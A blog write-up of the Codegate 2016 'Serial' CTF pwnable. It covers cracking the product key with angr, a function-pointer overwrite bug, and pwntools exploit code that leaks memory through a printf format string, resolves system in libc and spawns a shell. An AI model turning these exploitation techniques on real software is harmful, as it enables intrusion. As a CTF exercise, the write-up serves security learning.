---
layout: post
title: Codegate Quals 2016 Serial
comments: true
category: ctf
tags: ctf, codegate, reversing, pwnable
---

This is a write-up of the challenge Serial from the Codegate qualification round 2016.

# The challenge

Serial is a 64bit x86 linux pwnable.

# Reversing

When the program is run, we got prompted for a product key:

```bash
$ ./serial
input product key:
```

After a short look at the binary we found that the check function was at `0x400ccb`,
and that it accepts 32 bytes of input which it somehow checks.
But after a first look at how the function worked we decided that is was simple but that it would be boring to reverse, and that it would take some time to write a keygen by hand.

So we decided on using [Angr](https://github.com/angr/angr), and so I wrote this script to crack it:

{% gist e6eac0e0a36be14096c3 %}

When we run this script it gives us the product key(after a short time):

```bash
$ python gen_serial.py
Serial is: '615066814080'
```

Giving this as input the program we finally get to the menu:

```bash
$ ./serial
input product key: 615066814080
Correct!
Smash me!
1. Add 2. Remove 3. Dump 4. Quit
choice >>
```

## The Bug

The program starts by allocating 10 elements of size 0x20 using `calloc`,
which we can then manipulate by the commands add, remove or dump.

The structure of these elements looks like:

```c
struct elem {
    char note[24];
    void *dump_func_pointer;
};
```

But the add command allows us to overwrite the function pointer,
and the dump command the just calls this pointer with a reference to the element as an argument.

# Exploitation

Luckily we have`printf` in the binary, so we can use the bug to call printf like

```c
printf("We can insert a nice format string here");
```

Thus we are able to read and write memory as we like, for example:

```python
from pwn import *

e = ELF("./serial")
r = process("./serial")

r.recvuntil("input product key:")
r.sendline("615066814080")

@MemLeak
def leak(addr):
    r.recvuntil("choice >> ")
    r.sendline("1")
    r.sendline("BB%13$sCC".ljust(24) + p64(e.plt["printf"]))
    # This is placed somewhere on the stack.
    r.sendline("3AAAAAAA"+p64(addr))
    # remember to remove the element, we only have 10.
    r.sendline("2\n0")
    r.recvuntil("BB")

    data = r.recvuntil("CC")[:-2] + "\x00"

    r.recvuntil("choice >> ")
    return data

# Magic from pwntools, which does pointer chasing and hashtable
# lookups to find stuff in memory. You should check it out.
d = DynELF(leak, elf = e)
system = d.lookup("system", "libc.so")
print "This is the address of 'system' in libc.so:", hex(system)
```

And it works:

```bash
$ python doit_serial.py
[*] '/home/user/serial'
    Arch:          amd64-64-little
    RELRO:         Partial RELRO
    Stack Canary:  Canary found
    NX:            NX enabled
    PIE:           No PIE
[+] Starting program './serial': Done
[+] Loading from '/home/user/serial': 0x7f739e8e61a8
[+] Resolving 'system' in 'libc.so': 0x7f739e8e61a8
This is the address of 'system' in libc.so: 0x7f739e35a490
```

And now we simply need to use `system` as our dumper function and call it the right way:

```python
r.recvuntil("choice >> ")
r.sendline("1")
r.sendline("sh;".ljust(24) + p64(system))
r.sendline("3")

# lol, have a shell
r.clean()
r.interactive()
```

## Final exploit

{% gist 4701e02ad015f9d1935c %}

